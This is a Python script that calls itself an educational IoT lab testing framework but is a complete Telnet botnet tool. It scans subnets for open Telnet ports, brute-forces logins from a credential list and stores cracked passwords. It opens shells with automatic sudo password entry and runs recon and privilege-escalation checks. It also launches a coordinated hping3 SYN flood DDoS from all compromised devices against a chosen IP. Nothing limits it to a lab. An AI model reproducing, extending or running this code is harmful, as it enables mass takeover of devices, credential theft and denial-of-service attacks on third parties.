#!/usr/bin/env python3
"""
IoT Lab Security Testing Framework - Enhanced Version
Educational tool for testing IoT devices in isolated lab environments
CRITICAL FIX: Resolves shell access and session exit issues
"""

import socket
import telnetlib
import threading
import time
import json
import sqlite3
from datetime import datetime
import ipaddress
import argparse
from concurrent.futures import ThreadPoolExecutor

class IoTLabTester:
    def __init__(self, db_file="iot_lab_results.db", speed_mode="normal"):
        self.db_file = db_file
        self.speed_mode = speed_mode
        self.init_database()
        self.vulnerable_devices = []
        self._stop_all_attacks = False
        
        # Speed configuration
        self.speed_configs = {
            "slow": {
                "scan_threads": 10,
                "scan_timeout": 5,
                "login_timeout": 15,
                "delay_between_attempts": 2.0,
                "description": "Slow and stealthy (10 threads, 2s delay)"
            },
            "normal": {
                "scan_threads": 50,
                "scan_timeout": 3,
                "login_timeout": 10,
                "delay_between_attempts": 0.5,
                "description": "Balanced speed (50 threads, 0.5s delay)"
            },
            "fast": {
                "scan_threads": 100,
                "scan_timeout": 2,
                "login_timeout": 8,
                "delay_between_attempts": 0.1,
                "description": "Fast scanning (100 threads, 0.1s delay)"
            },
            "turbo": {
                "scan_threads": 200,
                "scan_timeout": 1,
                "login_timeout": 5,
                "delay_between_attempts": 0.0,
                "description": "Maximum speed (200 threads, no delay)"
            }
        }
        
        self.config = self.speed_configs.get(speed_mode, self.speed_configs["normal"])
        print(f"[CONFIG] Speed mode: {speed_mode.upper()} - {self.config['description']}")
        
    def init_database(self):
        """Initialize SQLite database for storing results"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerable_devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT,
                username TEXT,
                password TEXT,
                device_banner TEXT,
                timestamp TEXT
            )
        ''')
        conn.commit()
        conn.close()
        
    def scan_telnet_port(self, ip, timeout=None):
        """Scan a single IP for open Telnet port (23)"""
        if timeout is None:
            timeout = self.config['scan_timeout']
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 23))
            sock.close()
            return result == 0
        except:
            return False
    
    def scan_subnet(self, subnet):
        """Scan subnet for open Telnet ports"""
        print(f"[INFO] Scanning subnet {subnet} for open Telnet ports...")
        open_hosts = []
        
        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
            
            with ThreadPoolExecutor(max_workers=self.config['scan_threads']) as executor:
                futures = {executor.submit(self.scan_telnet_port, str(ip)): str(ip) 
                          for ip in network.hosts()}
                
                for future in futures:
                    ip = futures[future]
                    try:
                        if future.result():
                            open_hosts.append(ip)
                            print(f"[+] Found open Telnet on {ip}")
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"[ERROR] Error scanning subnet: {e}")
            
        print(f"[INFO] Found {len(open_hosts)} hosts with open Telnet ports")
        return open_hosts
    
    def load_credentials(self, file_path):
        """Load credentials from file"""
        credentials = []
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    line = line.strip()
                    if line and ':' in line:
                        username, password = line.split(':', 1)
                        credentials.append((username, password))
        except FileNotFoundError:
            print(f"[ERROR] Credentials file {file_path} not found")
        except Exception as e:
            print(f"[ERROR] Error loading credentials: {e}")
            
        print(f"[INFO] Loaded {len(credentials)} credential pairs")
        return credentials
    
    def test_telnet_login(self, ip, username, password, timeout=None):
        """Test Telnet login with given credentials"""
        if timeout is None:
            timeout = self.config['login_timeout']
            
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=timeout)
            
            # Read initial banner
            banner = tn.read_until(b"login:", timeout=5).decode('ascii', errors='ignore')
            
            # Send username
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:", timeout=5)
            
            # Send password
            tn.write(password.encode('ascii') + b"\n")
            
            # Check for successful login
            response = tn.read_until(b"#", timeout=5).decode('ascii', errors='ignore')
            tn.close()
            
            if "#" in response or "$" in response:
                return True, banner.strip()
            else:
                return False, None
                
        except Exception as e:
            return False, None
    
    def save_vulnerable_device(self, ip, username, password, banner):
        """Save vulnerable device to database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Check if device already exists
        cursor.execute('SELECT id FROM vulnerable_devices WHERE ip_address = ? AND username = ?', 
                      (ip, username))
        if cursor.fetchone():
            conn.close()
            return
            
        # Insert new vulnerable device
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute('''
            INSERT INTO vulnerable_devices (ip_address, username, password, device_banner, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (ip, username, password, banner, timestamp))
        
        conn.commit()
        conn.close()
        print(f"[SAVE] Vulnerable device saved: {ip} ({username}:{password})")
    
    def brute_force_credentials(self, hosts, credentials):
        """Brute force credentials against list of hosts"""
        print(f"[ATTACK] Starting brute-force attack against {len(hosts)} hosts...")
        
        successful_logins = 0
        for ip in hosts:
            print(f"[TARGET] Testing {ip}...")
            
            for username, password in credentials:
                print(f"[ATTEMPT] {ip} - {username}:{password}")
                
                success, banner = self.test_telnet_login(ip, username, password)
                if success:
                    print(f"[SUCCESS] {ip} - {username}:{password}")
                    self.save_vulnerable_device(ip, username, password, banner)
                    successful_logins += 1
                    break
                else:
                    time.sleep(self.config['delay_between_attempts'])
                    
        print(f"[COMPLETE] Brute-force complete. {successful_logins} devices compromised.")
        return successful_logins > 0
    
    def list_vulnerable_devices(self):
        """List all vulnerable devices from database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT ip_address, username, password, device_banner, timestamp FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[INFO] No vulnerable devices found")
            return []
            
        print("\n[+] VULNERABLE DEVICES FOUND:")
        print("=" * 80)
        for i, device in enumerate(devices, 1):
            ip, username, password, banner, timestamp = device
            print(f"{i}. {ip} | {username}:{password} | {timestamp}")
            if banner:
                print(f"   Banner: {banner[:100]}...")
        print("=" * 80)
        
        return devices
    
    def print_credentials_only(self):
        """Print only the credentials in clean format"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT ip_address, username, password FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[INFO] No credentials found")
            return
            
        print("\n[+] DISCOVERED CREDENTIALS:")
        print("=" * 50)
        for device in devices:
            print(f"{device[0]} -> {device[1]}:{device[2]}")
        print("=" * 50)
    
    def interactive_session(self, ip, username, password):
        """Open interactive Telnet session with enhanced features - FIXED VERSION"""
        print(f"[INFO] Opening session to {ip} with {username}:{password}")
        print("[INFO] Available attack commands:")
        print("  1. whoami - Check current user")
        print("  2. uname -a - System information")
        print("  3. ps aux - Running processes")
        print("  4. netstat -an - Network connections")
        print("  5. cat /etc/passwd - User accounts")
        print("  6. sudo hping3 - Launch DoS attack (with auto-password)")
        print("  7. shell - Drop to interactive shell")
        print("  8. recon - Run reconnaissance commands")
        print("  9. exploit - Run exploitation commands")
        print("  10. exit - Close session")
        print("[INFO] Type 'help' for command details")
        
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            
            # Wait for prompt (# or $)
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                tn.read_until(b"$", timeout=5)
            
            while True:
                command = input(f"{ip}# ").strip()
                
                if command.lower() == 'exit' or command == '10':
                    print("[INFO] Closing telnet session...")
                    break
                elif command.lower() == 'help':
                    self._show_help()
                    continue
                elif command.lower() == 'shell' or command == '7':
                    print("[INFO] Dropping to interactive shell. Type 'exit_shell' to return to menu.")
                    result = self._interactive_shell(tn, ip, password)
                    if result == 'exit_session':
                        print("[INFO] Session terminated from shell mode.")
                        return 'exit_session'
                    continue
                elif command.lower() == 'recon' or command == '8':
                    self._run_recon_commands(tn, ip, password)
                    continue
                elif command.lower() == 'exploit' or command == '9':
                    self._run_exploit_commands(tn, ip, password)
                    continue
                elif command.startswith('sudo hping3'):
                    self._run_hping3_attack(tn, ip, password, command)
                    continue
                elif command == '6':
                    target = input("Enter target IP for hping3 attack: ").strip()
                    if target:
                        hping_cmd = f"sudo hping3 -S --flood --rand-source -V {target}"
                        self._run_hping3_attack(tn, ip, password, hping_cmd)
                    continue
                    
                # Handle numbered commands
                if command.isdigit():
                    command = self._get_numbered_command(command)
                    if not command:
                        print(f"[ERROR] Invalid command number. Type 'help' for available commands.")
                        continue
                
                if command:
                    tn.write(command.encode('ascii') + b"\n")
                    response = tn.read_until(b"#", timeout=10)
                    if b"#" not in response:
                        response += tn.read_until(b"$", timeout=5)
                    print(response.decode('ascii', errors='ignore'))
                    
            print(f"[INFO] Session to {ip} closed successfully.")
            tn.close()
            
        except Exception as e:
            print(f"[ERROR] Session error: {e}")
    
    def _show_help(self):
        """Show detailed help for commands"""
        print("\n[HELP] Detailed Command Information:")
        print("="*60)
        print("1. whoami          - Display current username")
        print("2. uname -a        - Show system kernel and architecture")
        print("3. ps aux          - List all running processes")
        print("4. netstat -an     - Show network connections and ports")
        print("5. cat /etc/passwd - Display user accounts")
        print("6. sudo hping3     - Launch DoS flood attack (auto-password)")
        print("7. shell           - Interactive shell mode")
        print("8. recon           - Automated reconnaissance")
        print("9. exploit         - Automated exploitation attempts")
        print("10. exit           - Close telnet session")
        print("\nSpecial Commands:")
        print("- help             - Show this help menu")
        print("- Custom commands  - Type any Linux command directly")
        print("="*60)
    
    def _get_numbered_command(self, number):
        """Convert numbered choice to actual command"""
        commands = {
            '1': 'whoami',
            '2': 'uname -a',
            '3': 'ps aux',
            '4': 'netstat -an',
            '5': 'cat /etc/passwd'
        }
        return commands.get(number)
    
    def _interactive_shell(self, tn, ip, password):
        """Interactive shell mode - FIXED VERSION"""
        print(f"[SHELL] Interactive shell on {ip}")
        print("[SHELL] Type 'exit_shell' to return to command menu")
        print("[SHELL] Type 'exit' to close the entire telnet session")
        
        while True:
            try:
                command = input(f"shell@{ip}:~$ ").strip()
                
                if command.lower() == 'exit_shell':
                    print("[INFO] Returning to command menu...")
                    break
                elif command.lower() == 'exit':
                    print("[INFO] Closing telnet session from shell...")
                    return 'exit_session'
                
                if command.startswith('sudo') and command != 'sudo -l':
                    # Auto-handle sudo password
                    tn.write(command.encode('ascii') + b"\n")
                    response = tn.read_until(b"password", timeout=3)
                    if b"password" in response.lower():
                        print(f"[AUTO] Entering password for sudo command...")
                        tn.write(password.encode('ascii') + b"\n")
                        response = tn.read_until(b"#", timeout=15)
                        if b"#" not in response:
                            response += tn.read_until(b"$", timeout=5)
                    print(response.decode('ascii', errors='ignore'))
                else:
                    tn.write(command.encode('ascii') + b"\n")
                    response = tn.read_until(b"#", timeout=10)
                    if b"#" not in response:
                        response += tn.read_until(b"$", timeout=5)
                    print(response.decode('ascii', errors='ignore'))
                    
            except KeyboardInterrupt:
                print("\n[INFO] Use 'exit_shell' to return to menu or 'exit' to close session")
                continue
            except Exception as e:
                print(f"[ERROR] Shell error: {e}")
                break
        
        return None
    
    def _run_hping3_attack(self, tn, ip, password, command):
        """Run hping3 attack with automatic password handling"""
        print(f"[ATTACK] Launching hping3 attack from {ip}")
        print(f"[CMD] {command}")
        
        try:
            tn.write(command.encode('ascii') + b"\n")
            
            # Check for password prompt
            response = tn.read_until(b"password", timeout=3)
            if b"password" in response.lower():
                print(f"[AUTO] Entering sudo password...")
                tn.write(password.encode('ascii') + b"\n")
                
            # Wait for attack to start, then stop it quickly
            print("[INFO] Attack initiated. Stopping after 3 seconds...")
            time.sleep(3)
            
            # Send Ctrl+C to stop the attack
            tn.write(b"\x03")
            response = tn.read_until(b"#", timeout=5)
            if b"#" not in response:
                response += tn.read_until(b"$", timeout=3)
                
            print("[ATTACK] DoS attack completed")
            print(response.decode('ascii', errors='ignore'))
            
        except Exception as e:
            print(f"[ERROR] Attack failed: {e}")
    
    def _run_recon_commands(self, tn, ip, password):
        """Run automated reconnaissance commands"""
        print(f"[RECON] Running reconnaissance on {ip}...")
        
        recon_commands = [
            ("System Info", "uname -a"),
            ("Current User", "whoami"),
            ("User ID", "id"),
            ("Network Config", "ifconfig -a"),
            ("Route Table", "route -n"),
            ("DNS Config", "cat /etc/resolv.conf"),
            ("Network Connections", "netstat -tuln"),
            ("Running Services", "ps aux | grep -E '(ssh|telnet|ftp|http|mysql)'"),
            ("Crontab", "crontab -l"),
            ("Home Directory", "ls -la ~"),
            ("Writable Directories", "find / -writable -type d 2>/dev/null | head -10")
        ]
        
        for desc, cmd in recon_commands:
            print(f"\n[RECON] {desc}: {cmd}")
            
            tn.write(cmd.encode('ascii') + b"\n")
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                response += tn.read_until(b"$", timeout=5)
            print(response.decode('ascii', errors='ignore'))
            time.sleep(0.5)
    
    def _run_exploit_commands(self, tn, ip, password):
        """Run automated exploitation commands"""
        print(f"[EXPLOIT] Running exploitation attempts on {ip}...")
        
        exploit_commands = [
            ("Check sudo rights", "sudo -l"),
            ("Check SUID binaries", "find / -perm -4000 -type f 2>/dev/null"),
            ("Check capabilities", "getcap -r / 2>/dev/null"),
            ("Kernel version", "uname -r"),
            ("OS version", "cat /etc/os-release"),
            ("Check for Docker", "docker ps 2>/dev/null"),
            ("Environment variables", "env | grep -E '(PATH|HOME|USER|PWD)'"),
            ("Check /etc/passwd permissions", "ls -la /etc/passwd"),
            ("Check /etc/shadow permissions", "ls -la /etc/shadow"),
            ("Check for SSH keys", "find /home -name '*.ssh' -type d 2>/dev/null")
        ]
        
        for desc, cmd in exploit_commands:
            print(f"\n[EXPLOIT] {desc}: {cmd}")
            
            if cmd.startswith('sudo'):
                tn.write(cmd.encode('ascii') + b"\n")
                response = tn.read_until(b"password", timeout=3)
                if b"password" in response.lower():
                    print(f"[AUTO] Entering password for: {cmd}")
                    tn.write(password.encode('ascii') + b"\n")
                    response = tn.read_until(b"#", timeout=10)
                    if b"#" not in response:
                        response += tn.read_until(b"$", timeout=5)
            else:
                tn.write(cmd.encode('ascii') + b"\n")
                response = tn.read_until(b"#", timeout=10)
                if b"#" not in response:
                    response += tn.read_until(b"$", timeout=5)
                
            print(response.decode('ascii', errors='ignore'))
            time.sleep(0.5)
    
    def ddos_attack(self, target_ip):
        """Launch coordinated DDoS attack from all compromised devices"""
        print(f"[DDOS] Starting distributed DoS attack against {target_ip}")
        
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT ip_address, username, password FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[ERROR] No compromised devices available for DDoS attack")
            return
            
        print(f"[DDOS] Using {len(devices)} compromised devices")
        
        # Launch attacks in parallel
        threads = []
        for ip, username, password in devices:
            thread = threading.Thread(
                target=self._single_device_ddos,
                args=(ip, username, password, target_ip)
            )
            threads.append(thread)
            thread.start()
            
        # Wait for all attacks to complete
        for thread in threads:
            thread.join()
            
        print(f"[DDOS] Distributed attack against {target_ip} completed")
    
    def _single_device_ddos(self, ip, username, password, target_ip):
        """Run DDoS attack from a single compromised device"""
        try:
            print(f"[DDOS] Launching attack from {ip} -> {target_ip}")
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            
            # Wait for prompt
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                tn.read_until(b"$", timeout=5)
            
            # Launch hping3 attack
            attack_cmd = f"sudo hping3 -S --flood --rand-source -V {target_ip}"
            tn.write(attack_cmd.encode('ascii') + b"\n")
            
            # Handle password prompt
            response = tn.read_until(b"password", timeout=3)
            if b"password" in response.lower():
                tn.write(password.encode('ascii') + b"\n")
            
            # Let attack run for 10 seconds
            time.sleep(10)
            
            # Stop attack
            tn.write(b"\x03")
            
            tn.close()
            print(f"[DDOS] Attack from {ip} completed")
            
        except Exception as e:
            print(f"[ERROR] Attack from {ip} failed: {e}")
    
    def coordinated_reconnaissance(self):
        """Run reconnaissance on all compromised devices simultaneously"""
        print("[RECON] Starting coordinated reconnaissance")
        
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT ip_address, username, password FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[ERROR] No compromised devices available")
            return
            
        print(f"[RECON] Running reconnaissance on {len(devices)} devices")
        
        # Launch recon in parallel
        threads = []
        for ip, username, password in devices:
            thread = threading.Thread(
                target=self._single_device_recon,
                args=(ip, username, password)
            )
            threads.append(thread)
            thread.start()
            
        # Wait for all recon to complete
        for thread in threads:
            thread.join()
            
        print("[RECON] Coordinated reconnaissance completed")
    
    def _single_device_recon(self, ip, username, password):
        """Run reconnaissance on a single device"""
        try:
            print(f"\n[RECON] Starting reconnaissance on {ip}")
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            
            # Wait for prompt
            response = tn.read_until(b"#", timeout=10)
            if b"#" not in response:
                tn.read_until(b"$", timeout=5)
            
            # Quick recon commands
            quick_recon = [
                ("System", "uname -a"),
                ("Network", "ifconfig | grep inet"),
                ("Processes", "ps aux | wc -l"),
                ("Users", "who"),
                ("Uptime", "uptime")
            ]
            
            for desc, cmd in quick_recon:
                tn.write(cmd.encode('ascii') + b"\n")
                response = tn.read_until(b"#", timeout=5)
                if b"#" not in response:
                    response += tn.read_until(b"$", timeout=3)
                result = response.decode('ascii', errors='ignore').strip()
                if result:
                    print(f"[RECON] {ip} - {desc}: {result.split()[-1] if result.split() else 'N/A'}")
            
            tn.close()
            
        except Exception as e:
            print(f"[ERROR] Recon on {ip} failed: {e}")


def main():
    parser = argparse.ArgumentParser(description='IoT Lab Security Testing Framework')
    parser.add_argument('--scan', help='Subnet to scan (e.g., 192.168.1.0/24)')
    parser.add_argument('--creds', help='Credentials file path', default='credentials.txt')
    parser.add_argument('--speed', choices=['slow', 'normal', 'fast', 'turbo'], 
                       default='normal', help='Scanning speed mode')
    parser.add_argument('--creds-only', action='store_true', help='Print only discovered credentials')
    parser.add_argument('--list', action='store_true', help='List vulnerable devices')
    parser.add_argument('--session', help='Open session to IP address')
    
    args = parser.parse_args()
    
    tester = IoTLabTester(speed_mode=args.speed)
    
    if args.scan:
        # Scan and brute force
        hosts = tester.scan_subnet(args.scan)
        if hosts:
            credentials = tester.load_credentials(args.creds)
            tester.brute_force_credentials(hosts, credentials)
            
    elif args.creds_only:
        # Print only credentials
        tester.print_credentials_only()
        
    elif args.list:
        # List vulnerable devices
        tester.list_vulnerable_devices()
        
    elif args.session:
        # Open interactive session
        devices = tester.list_vulnerable_devices()
        target_device = None
        
        for device in devices:
            if device[1] == args.session:  # IP match
                target_device = device
                break
                
        if target_device:
            tester.interactive_session(target_device[1], target_device[2], target_device[3])
        else:
            print(f"[ERROR] No credentials found for {args.session}")
            
    else:
        # Interactive mode
        print("=" * 60)
        print("IoT Lab Security Testing Framework")
        print("=" * 60)
        print("Select operation:")
        print("1. Network Scan & Brute-force")
        print("2. List Vulnerable Devices")  
        print("3. Print Discovered Credentials")
        print("4. Interactive Session")
        print("5. Exit")
        print("6. Distributed DDoS Attack")
        print("7. Coordinated Reconnaissance")
        print("=" * 60)
        
        while True:
            try:
                choice = input("\nEnter choice (1-7): ").strip()
                
                if choice == '5':
                    print("[INFO] Exiting...")
                    break
                    
                elif choice == '1':
                    # Hierarchical menu for scan operations
                    subnet = input("Enter subnet to scan (e.g., 192.168.1.0/24): ").strip()
                    if not subnet:
                        print("[ERROR] Subnet is required")
                        continue
                        
                    print("\nSelect speed:")
                    print("1. Slow (5 second delays)")
                    print("2. Normal (1 second delays)")  
                    print("3. Fast (0.1 second delays)")
                    print("4. Turbo (no delays)")
                    
                    speed_choice = input("Speed choice (1-4): ").strip()
                    speed_map = {'1': 'slow', '2': 'normal', '3': 'fast', '4': 'turbo'}
                    speed = speed_map.get(speed_choice, 'normal')
                    
                    tester = IoTLabTester(speed_mode=speed)
                    hosts = tester.scan_subnet(subnet)
                    if hosts:
                        credentials = tester.load_credentials('credentials.txt')
                        tester.brute_force_credentials(hosts, credentials)
                    else:
                        print("[INFO] No telnet hosts found")
                        
                elif choice == '2':
                    tester = IoTLabTester(speed_mode='normal')
                    tester.list_vulnerable_devices()
                    
                elif choice == '3':
                    tester = IoTLabTester(speed_mode='normal')
                    tester.print_credentials_only()
                    
                elif choice == '4':
                    tester = IoTLabTester(speed_mode='normal')
                    devices = tester.list_vulnerable_devices()
                    
                    if devices:
                        print("\nSelect device for interactive session:")
                        for i, device in enumerate(devices, 1):
                            print(f"{i}. {device[1]} ({device[2]}:{device[3]})")
                            
                        device_choice = input("Device choice: ").strip()
                        try:
                            device_idx = int(device_choice) - 1
                            if 0 <= device_idx < len(devices):
                                device = devices[device_idx]
                                result = tester.interactive_session(device[1], device[2], device[3])
                                if result == 'exit_session':
                                    print("[INFO] Session closed by user")
                            else:
                                print("[ERROR] Invalid device selection")
                        except ValueError:
                            # Try IP match
                            ip = device_choice
                            found = False
                            for device in devices:
                                if device[1] == ip:
                                    result = tester.interactive_session(device[1], device[2], device[3])
                                    if result == 'exit_session':
                                        print("[INFO] Session closed by user")
                                    found = True
                                    break
                            if not found:
                                print(f"[ERROR] No credentials found for {ip}")
                    else:
                        print("[INFO] No vulnerable devices found. Run a brute-force attack first.")
                
                elif choice == '6':
                    # DDoS attack
                    tester = IoTLabTester(speed_mode='normal')
                    target_ip = input("Enter target IP for DDoS attack: ").strip()
                    if target_ip:
                        tester.ddos_attack(target_ip)
                    else:
                        print("[ERROR] Target IP is required")
                
                elif choice == '7':
                    # Coordinated reconnaissance
                    tester = IoTLabTester(speed_mode='normal')
                    tester.coordinated_reconnaissance()
                
                else:
                    print("[ERROR] Invalid selection. Please choose 1-7.")
                    
            except KeyboardInterrupt:
                print("\n[INFO] Exiting...")
                break
            except Exception as e:
                print(f"[ERROR] An error occurred: {e}")

if __name__ == "__main__":
    main()
